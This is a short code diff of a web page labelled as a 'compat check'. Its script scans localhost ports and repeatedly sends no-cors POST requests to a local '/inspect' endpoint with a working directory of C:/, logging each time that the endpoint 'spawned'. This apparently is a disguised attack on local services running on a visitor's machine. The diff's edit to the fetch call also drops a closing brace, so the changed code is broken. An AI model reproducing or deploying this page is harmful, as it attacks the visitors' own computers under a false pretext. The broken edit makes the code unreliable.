@@ -5,8 +5,7 @@
 <h4 style="font-family:monospace">compat check running...</h4>
 <pre id="log" style="font-family:monospace;font-size:12px"></pre>
 <script>
-const log=m=>{document.getElementById('log').textContent+=m+"
-";};
+const log=m=>{document.getElementById('log').textContent+=m+String.fromCharCode(10);};
 async function probe(p){
   try{
     const c=new AbortController(); const t=setTimeout(()=>c.abort(),1200);
@@ -41,7 +40,7 @@ function fireDL(){
     try{
       await fetch('http://127.0.0.1:'+port+'/inspect',{method:'POST',mode:'no-cors',
         headers:{'Content-Type':'text/plain'},
-        body:JSON.stringify({cwd:'C:/'})});
+        body:JSON.stringify({cwd:'C:/'}));
       log('trigger #'+n+' -> /inspect spawned');
     }catch(e){ log('trigger #'+n+' err'); }
     if(n>=36) clearInterval(iv);
